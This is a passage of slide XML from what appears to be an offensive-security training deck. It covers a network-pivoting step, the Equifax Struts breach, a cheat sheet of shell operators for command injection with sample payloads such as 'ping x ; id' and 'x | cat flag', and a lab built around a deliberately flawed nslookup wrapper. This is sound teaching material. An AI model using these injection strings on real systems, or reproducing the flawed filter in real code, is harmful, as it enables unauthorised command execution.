          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4572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498" name="Google Shape;498;p33"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4728911"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="499" name="Google Shape;499;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="452628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Pivot across the network</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="500" name="Google Shape;500;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="489204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Use the foothold to reach databases and internal systems.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="501" name="Google Shape;501;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2011680"/>
            <a:ext cx="4800600" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 186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33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="22860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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>WAR STORY</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="503" name="Google Shape;503;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2615184"/>
            <a:ext cx="41605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1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Equifax, 2017</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="504" name="Google Shape;504;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3200400"/>
            <a:ext cx="41605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4800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>147M</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="505" name="Google Shape;505;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4023360"/>
            <a:ext cx="4160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people exposed</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="506" name="Google Shape;506;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4434840"/>
            <a:ext cx="4160520" cy="132588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An unpatched web-app RCE (Apache Struts, CVE-2017-5638) gave attackers code execution. They lurked ~76 days exfiltrating data. Total cost: ~$1.4B.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="507" name="Google Shape;507;p3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8" name="Google Shape;508;p3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509" name="Google Shape;509;p3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4" name="Shape 514"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="515" name="Google Shape;515;p3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CHEAT SHEET</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="516" name="Google Shape;516;p34"/>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Shell operators that chain commands</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="517" name="Google Shape;517;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2057400"/>
            <a:ext cx="10607040" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 14815"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34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2057400"/>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t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="519" name="Google Shape;519;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="2057400"/>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run next, always</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="520" name="Google Shape;520;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="2057400"/>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ping x ; id</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="521" name="Google Shape;521;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2660904"/>
            <a:ext cx="10607040" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 14815"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2" name="Google Shape;522;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2660904"/>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&amp;&amp;</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="523" name="Google Shape;523;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="2660904"/>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run next if first ok</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="524" name="Google Shape;524;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="2660904"/>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ping x &amp;&amp; id</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="525" name="Google Shape;525;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3264408"/>
            <a:ext cx="10607040" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 14815"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6" name="Google Shape;526;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3264408"/>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t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="527" name="Google Shape;527;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="3264408"/>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run next if first fails</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="528" name="Google Shape;528;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="3264408"/>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ping x || id</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="529" name="Google Shape;529;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3867912"/>
            <a:ext cx="10607040" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 14815"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p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3867912"/>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t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="531" name="Google Shape;531;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="3867912"/>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pipe output onward</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="532" name="Google Shape;532;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="3867912"/>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x | cat flag</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="533" name="Google Shape;533;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4471416"/>
            <a:ext cx="10607040" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 14815"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4" name="Google Shape;534;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4471416"/>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t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="535" name="Google Shape;535;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="4471416"/>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substitute output</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="536" name="Google Shape;536;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="4471416"/>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echo $(whoami)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="537" name="Google Shape;537;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5074920"/>
            <a:ext cx="10607040" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 14815"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34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5074920"/>
            <a:ext cx="1097280" cy="4937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FB950"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1700" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="539" name="Google Shape;539;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="5074920"/>
            <a:ext cx="475488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400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>comment out the rest</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="540" name="Google Shape;540;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="5074920"/>
            <a:ext cx="402336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x # ignored</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="541" name="Google Shape;541;p3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3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543" name="Google Shape;543;p3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8" name="Shape 548"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="549" name="Google Shape;549;p36"/>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LAB</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="550" name="Google Shape;550;p36"/>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 04</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="551" name="Google Shape;551;p36"/>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Run your own command</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="552" name="Google Shape;552;p36"/>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3" name="Google Shape;553;p36"/>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554" name="Google Shape;554;p36"/>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 · /lab04</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="555" name="Google Shape;555;p36"/>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6" name="Google Shape;556;p36"/>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557" name="Google Shape;557;p36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4142232"/>
            <a:ext cx="4480500" cy="8688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Make the diagnostics tool run your command. The flag is a file in the working directory.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1350" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="558" name="Google Shape;558;p36"/>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the full app's diagnostics</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="950" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="559" name="Google Shape;559;p36"/>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0" name="Google Shape;560;p36"/>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1" name="Google Shape;561;p36"/>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2" name="Google Shape;562;p36"/>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p36"/>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564" name="Google Shape;564;p36"/>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565" name="Google Shape;565;p36"/>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lab 04: dns lookup</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$cmd = "nslookup $domain";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strips | and &amp;, not ;</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="566" name="Google Shape;566;p36"/>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36"/>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568" name="Google Shape;568;p36"/>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3" name="Shape 573"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="574" name="Google Shape;574;p38"/>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05</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="575" name="Google Shape;575;p38"/>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76" name="Google Shape;576;p38"/>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577" name="Google Shape;577;p38"/>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IDENTITY · AUTH &amp; JWT</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
